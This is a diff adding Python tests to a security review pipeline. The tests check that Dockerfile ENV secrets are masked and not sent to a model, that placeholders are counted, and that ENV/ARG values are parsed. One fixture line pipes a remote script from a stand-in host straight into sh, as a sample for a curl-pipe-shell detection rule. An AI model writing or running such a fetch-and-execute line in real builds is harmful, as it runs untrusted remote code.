@@ -110,3 +110,35 @@ def test_a_scanner_that_did_not_run_is_named_never_reported_as_a_finding():
                 _f("a.js", 2, Severity.MEDIUM)], {"a.js": "x\ny\n"}, max_files=10, max_findings_per_file=30)
     assert t.unavailable == ["semgrep-non-python"]
     assert all(f.file != "<pr>" for f in t.passthrough + t.unreviewed + sum(t.to_model.values(), []))
+
+
+# codeguard-dockerfile-secret-in-env: a credential rule like Java's -- decided
+# by the value's shape, its line masked, never sent to the model.
+DOCKER_SECRET = "codeguard-dockerfile-secret-in-env"
+
+
+def test_a_dockerfile_env_secret_is_decided_by_shape_and_never_sent():
+    key = _key(9)
+    content = f"FROM python:3.12-slim\nENV DB_PASSWORD={key}\nRUN curl -fsSL https://x.example/i.sh | sh\n"
+    t = triage([_f("Dockerfile", 2, Severity.HIGH, rule=DOCKER_SECRET),
+                _f("Dockerfile", 3, Severity.HIGH, rule="codeguard-dockerfile-curl-pipe-shell")],
+               {"Dockerfile": content}, max_files=10, max_findings_per_file=30)
+    [reported] = [f for f in t.passthrough if f.rule_id == DOCKER_SECRET]
+    assert reported.severity == Severity.HIGH and key not in reported.message
+    assert [f.rule_id for f in t.to_model["Dockerfile"]] == ["codeguard-dockerfile-curl-pipe-shell"]
+    assert t.masked_lines == {"Dockerfile": {2}}
+
+
+def test_a_placeholder_in_a_dockerfile_env_is_counted_not_reported():
+    content = "FROM python:3.12-slim\nENV DB_PASSWORD=changeme\n"
+    t = triage([_f("Dockerfile", 2, Severity.HIGH, rule=DOCKER_SECRET)], {"Dockerfile": content},
+               max_files=10, max_findings_per_file=30)
+    assert t.passthrough == [] and t.placeholders == 1
+
+
+def test_dockerfile_values_are_read_quoted_or_not_with_either_syntax():
+    from codeguard.pipeline.generic_review import dockerfile_assigned_value
+    assert dockerfile_assigned_value("ENV DB_PASSWORD=hunter22") == "hunter22"
+    assert dockerfile_assigned_value('ENV DB_PASSWORD="hunter 22"') == "hunter 22"
+    assert dockerfile_assigned_value("ARG API_TOKEN abc123") == "abc123"
+    assert dockerfile_assigned_value("ARG API_TOKEN") is None
